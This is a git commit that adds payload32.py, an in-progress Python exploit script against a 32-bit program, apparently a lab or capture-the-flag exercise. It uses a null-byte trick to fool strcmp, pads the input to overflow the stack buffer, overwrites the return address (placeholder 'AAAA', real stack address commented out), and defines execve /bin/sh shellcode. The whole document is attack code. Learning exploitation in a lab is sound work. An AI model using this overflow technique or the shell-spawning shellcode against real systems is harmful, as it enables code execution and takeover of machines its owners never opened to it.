dda6f7766ac04c7e0c5c52b779692dc241673222
Ben <badrean@tamu.edu>
2026-03-30 21:10:07 +0000

    Final commit before completely changing how I'm making my padding for the payload.

---
+++ payload32.py
@@ -0,0 +1,26 @@
+import sys
+
+# Buffer start address: 0xffffcd48
+
+# 1. Select difficulty
+sys.stdout.buffer.write(b"1\n")
+
+# 2. The Command
+# We start with 'sair' and a NULL terminator \x00
+# This makes strcmp think the string is just "sair"
+# But scanf keeps reading the rest of the padding into the stack!
+command = b"sair\x00"
+
+# 3. The Padding
+padding = b"\x00" * (979)
+
+# 4. The Target RIP
+# target_rip = b"\x48\xcd\xff\xff"
+target_rip = b"AAAA"
+
+shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80"
+
+# 5. Execute
+sys.stdout.buffer.write(command + padding + target_rip + b"\n")
+
+# With the way the payload is right now, after executing, the code points to "target_rip".
